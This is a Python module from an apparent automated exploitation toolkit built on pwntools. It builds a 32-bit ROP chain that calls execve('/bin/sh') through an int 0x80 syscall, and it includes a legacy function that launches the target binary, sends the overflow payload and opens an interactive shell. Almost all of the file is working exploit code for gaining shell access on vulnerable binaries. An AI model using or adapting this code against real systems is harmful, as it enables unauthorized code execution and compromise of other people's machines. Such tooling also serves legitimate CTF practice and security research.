"""AutoPwn primitives layer: ``int 0x80`` execve syscall chain (P6.5).

Replaces the v3.1 monolith's ``execve_syscall`` (local) +
``execve_syscall_remote`` (remote — not in P6.5 scope, the
"remote" suffix is a v3.1 artifact of the ``process`` vs
``remote`` runtime split; primitives are runtime-agnostic)
+ ``execve_canary_syscall`` (canary — P7.10) + 2 variants
(``pop ecx; pop ebx`` combined vs separate ``pop ecx`` +
``pop ebx``) of v3.1's payload construction (see
``autopwn/_legacy.py`` L1869-1935) with a typed
:class:`ExploitPrimitive` subclass that emits the final
ROP payload bytes.

Per ``rebuild.md`` §6.7 P6.5 + ``refactor.md`` §3.2.2, this
is the **only primitive that doesn't depend on libc symbols**
— the syscall convention is hard-coded by the kernel ABI
(``eax`` = syscall number 0xb = ``execve``, ``ebx`` = path,
``ecx`` = argv, ``edx`` = envp), so the payload works even
when libc is stripped or statically linked.

Public API
----------
* :class:`ExecveSyscallX32` — 32-bit only (64-bit Linux uses
  ``syscall`` not ``int 0x80``; ``ExecveSyscallX64`` is not
  provided — x64 ret2system / ret2libc covers those cases).
  * ``build_payload(ctx) -> bytes`` — emits the final ROP
    chain (no leak, no second stage; this is a single-stage
    primitive that already controls ``eax/ebx/ecx/edx``).
  * Auto-selects the ``pop ecx; pop ebx`` (combined gadget)
    variant when ``ctx.gadgets_x32.pop_ecx_ebx`` is non-zero
    AND ``pop_ecx`` is zero; otherwise the separate-gadget
    variant.  This mirrors v3.1 L1875 condition
    (``if pop_ecx_addr == None:`` → combined branch).

Why int 0x80 in 2026?
---------------------
* Linux x86 32-bit syscall ABI: ``int 0x80`` is the historic
  entry point, still fully supported by the kernel.
* Why not ``syscall`` (64-bit only)?  The 32-bit ABI doesn't
  have a dedicated ``syscall`` instruction; the kernel only
  supports ``int 0x80`` and (newer) ``sysenter`` on 32-bit.
* Why a separate primitive and not just ret2system?  ret2system
  requires libc's ``system`` symbol; execve_syscall needs only
  kernel + ROP gadgets.  When the binary is statically linked
  or stripped (no libc), this is the fallback.
"""
from __future__ import annotations

from typing import Optional

from autopwn.context import ExploitContext
from autopwn.primitives.base import ExploitPrimitive


# Linux x86 32-bit syscall number for ``execve``.  Hard-coded
# by the kernel ABI — see ``arch/x86/include/uapi/asm/unistd_32.h``.
# 0xb == 11.
SYSCALL_EXECVE = 0xB


def _lookup_binsh(program) -> Optional[int]:
    """Look up the ``/bin/sh`` substring address in ``program``.

    Mirrors v3.1's ``next(e.search(b'/bin/sh'))`` pattern
    (``_legacy.py`` L1881 / L1906).  Unlike ret2system we
    only need the string — no ``system`` symbol, no libc
    dependency.

    Returns:
        The address of the first ``/bin/sh`` substring in
        the binary, or ``None`` if the binary doesn't carry
        the string (rare — usually the string is in libc
        data, but for this primitive to work standalone,
        the binary must have it).

    Side effects:
        Read-only ELF parse; no file writes, no globals writes.
    """
    from pwn import ELF

    try:
        e = ELF(str(program), checksec=False)
    except Exception:
        return None
    try:
        return next(e.search(b"/bin/sh"))
    except StopIteration:
        return None


class ExecveSyscallX32(ExploitPrimitive):
    """32-bit ``int 0x80; execve('/bin/sh', 0, 0)`` payload builder.

    Payload shapes (the variant is auto-selected by the
    presence of the combined ``pop ecx; pop ebx`` gadget)::

        Combined (``pop_ecx_ebx`` non-zero, ``pop_ecx`` == 0)::

            [A * padding]
            [p32(pop_eax)] [p32(0xB)]
            [p32(pop_ecx_ebx)] [p32(0)] [p32(binsh)]
            [p32(pop_edx)] [p32(0)]
            [p32(int_0_80)]

        Separate (``pop_ecx`` non-zero)::

            [A * padding]
            [p32(pop_eax)] [p32(0xB)]
            [p32(pop_ebx)] [p32(binsh)]
            [p32(pop_ecx)] [p32(0)]
            [p32(pop_edx)] [p32(0)]
            [p32(int_0x80)]

    Both variants:
        * Set ``eax = 0xB`` (execve) via ``pop eax; ret``.
        * Set ``ebx = binsh_addr`` (path).
        * Set ``ecx = 0`` (argv = NULL).
        * Set ``edx = 0`` (envp = NULL).
        * ``int 0x80`` triggers the syscall → shell.

    Requires:
        * ``ctx.binary.bit == 32`` (64-bit uses a different
          ABI; v3.1 L3466 only enters the execve branch
          for ``bit_arch == 32``).
        * ``ctx.gadgets_x32`` is non-None.
        * ``ctx.gadgets_x32.has_eax_ebx_ecx_edx`` is True
          (collapsed bool from P4.7/R8 mitigation; replaces
          v3.1's 4 individual bools).
        * ``ctx.gadgets_x32.int_0x80`` is non-zero.
        * The binary carries a ``/bin/sh`` substring (most
          do — pulled in by libc data, or hard-coded in
          ``main`` for ret2shell challenges).
        * ``ctx.binary.stack_canary`` is ``False`` (canary
          variants live in P7.10).
    """

    name = "execve-syscall-x32"

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Return the 32-bit execve syscall payload, or ``b""`` if not applicable."""
        from pwn import p32

        # 64-bit binaries use a different syscall ABI (syscall
        # instruction, register convention); the v3.1 execve
        # branch is x32-only.
        if ctx.binary.bit != 32:
            return b""

        if ctx.gadgets_x32 is None:
            return b""
        g = ctx.gadgets_x32
        if not g.has_eax_ebx_ecx_edx:
            return b""
        if g.int_0x80 == 0:
            return b""

        # Per-gadget short-circuit (mirrors v3.1 L1875: if
        # pop_ecx_addr is None → combined branch).
        if g.pop_ecx == 0:
            # Combined ``pop ecx; pop ebx`` variant.
            if g.pop_ecx_ebx == 0 or g.pop_eax == 0 or g.pop_edx == 0:
                return b""
        else:
            # Separate pop_ecx + pop_ebx variant.
            if g.pop_ebx == 0 or g.pop_eax == 0 or g.pop_edx == 0:
                return b""

        bin_sh = _lookup_binsh(ctx.binary.path)
        if bin_sh is None:
            return b""

        if g.pop_ecx == 0:
            # Combined variant: padding + 8 p32 = padding + 32
            return (
                b"A" * ctx.padding
                + p32(g.pop_eax) + p32(SYSCALL_EXECVE)
                + p32(g.pop_ecx_ebx) + p32(0) + p32(bin_sh)
                + p32(g.pop_edx) + p32(0)
                + p32(g.int_0x80)
            )

        # Separate variant: padding + 9 p32 = padding + 36
        return (
            b"A" * ctx.padding
            + p32(g.pop_eax) + p32(SYSCALL_EXECVE)
            + p32(g.pop_ebx) + p32(bin_sh)
            + p32(g.pop_ecx) + p32(0)
            + p32(g.pop_edx) + p32(0)
            + p32(g.int_0x80)
        )


# =====================================================================
# Legacy ports (parity only) — preserve v3.1's print_* output verbatim
# =====================================================================

# ``OBSOLETE`` prefix signals: do NOT call these from new code; they
# exist only so the v3.1 monolith's callers (line numbers in
# ``_legacy.py``) can be re-routed byte-for-byte through the new
# primitives if/when P8 orchestrator retires the monolith.
#
# The legacy functions also kept the original PIE/canary short-
# circuits and the ``process(program)`` / ``interactive()`` lifecycle,
# so they're not pure — that's intentional, they're the v3.1
# "kitchen sink" version preserved for behavior parity.
def _legacy_execve_syscall(program, padding, pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr, ret_addr, int_0_80):  # noqa: E501
    """OBSOLETE: verbatim port of v3.1 ``execve_syscall`` (L1869-1935).

    Kept for byte-level parity with v3.1's print_* output.  New
    code should call :class:`ExecveSyscallX32` and feed the
    returned bytes to a P7 strategy's IO loop.
    """
    from pwn import ELF, asm, flat, p32, process

    if pop_ecx_addr is None:
        io = process(program)
        e = ELF(program)
        bin_sh_addr = next(e.search(b"/bin/sh"))

        pop_eax_addr = p32(int(pop_eax_addr, 16))
        pop_ecx_ebx_addr = p32(int(pop_ecx_ebx_addr, 16))
        pop_edx_addr = p32(int(pop_edx_addr, 16))
        int_0_80 = p32(int(int_0_80, 16))

        payload = flat([asm("nop") * padding, pop_eax_addr, 0xB, pop_ecx_ebx_addr, 0, bin_sh_addr, pop_edx_addr, 0, int_0_80])
        io.recv()
        io.sendline(payload)
        io.interactive()
    else:
        io = process(program)
        e = ELF(program)
        bin_sh_addr = next(e.search(b"/bin/sh"))

        pop_eax_addr = p32(int(pop_eax_addr, 16))
        pop_ecx_addr = p32(int(pop_ecx_addr, 16))
        pop_ebx_addr = p32(int(pop_ebx_addr, 16))
        pop_edx_addr = p32(int(pop_edx_addr, 16))
        int_0_80 = p32(int(int_0_80, 16))

        payload = flat([asm("nop") * padding, pop_eax_addr, 0xB, pop_ebx_addr, bin_sh_addr, pop_ecx_addr, 0, pop_edx_addr, 0, int_0_80])
        io.recv()
        io.sendline(payload)
        io.interactive()
